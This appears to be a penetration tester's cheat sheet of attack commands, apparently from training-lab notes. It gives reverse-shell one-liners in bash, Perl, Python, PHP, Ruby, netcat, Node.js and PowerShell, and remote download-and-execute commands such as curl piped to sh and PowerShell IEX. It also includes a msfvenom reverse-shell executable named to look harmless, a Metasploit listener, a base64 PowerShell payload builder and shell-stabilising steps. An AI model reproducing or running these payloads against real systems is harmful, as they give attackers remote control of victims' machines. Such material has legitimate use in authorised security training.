# SHELL UPGRADE
```bash
# Shell to bash (Does not work with rlwrap!!)
SHELL=/bin/bash script -q /dev/null
Ctrl + Z
stty raw -echo;fg

# Python pty
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

Ctrl + Z

stty raw -echo; fg
stty size
stty rows 38 columns 116
```
eval "$(stty size | awk '{printf "stty rows %s columns %s", $1, $2}')"

-----------------------

# ONE-LINERS
```bash
# Linux
sh <(curl -sSf http://my-server/myscrit.sh)

# Windows
powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://myserver/my.ps1'); <params>
```

-----------------------

# METERPRETER
```bash
msfconsole > use multi/script/web_delivery > run
# Copy output on current reverse shell
```

-----------------------

# BASH
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

-----------------------

# PERL
```bash
perl -e 'use Socket;$i="192.168.2.210";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

-----------------------

# PYTHON
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

-----------------------

# PHP
```bash
<?php $sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
php -r '$sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

-----------------------

# RUBY
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

-----------------------

# NETCAT
```bash
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.218 1234 >/tmp/f
```

-----------------------

# MALICIOUS EXE
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=7777 -f exe -o auditTracker.exe
```

-----------------------

# LISTENER ENDPOINT
```bash
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.45.235; set lport 7777; set ExitOnSession false; exploit -j"
```

-----------------------

# POWERSHELL
```bash
powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.235:1337/Invoke-PowerShellTcp.ps1\")" 
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177:8000/powercat.ps1'); powercat -c 192.168.45.177 -p 4444 -e powershell"
```

-----------------------

# CREATE POWERSHELL ONE-LINER
```bash
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
-----------------------

# NODEJS
```bash
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(21, "192.168.45.165", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
-----------------------

# Shell for unreliable exploit
```bash
# Windows
payload_1 = f'cmd.exe /c mkdir C:\TEMP'.encode('utf-8')
payload_3 = f'powershell -c "iwr -uri http://192.168.45.215/shell.exe -Outfile C:\TEMP\shell.exe"'.encode('utf-8')
payload_4 = f'cmd.exe /c "C:\TEMP\shell.exe"'.encode('utf-8')

# Linux
1. Write a script with a reverse shell
2. Pass it onto the machine
3. at now -f /home/aero/shell.sh (run the shell with `at`)
```


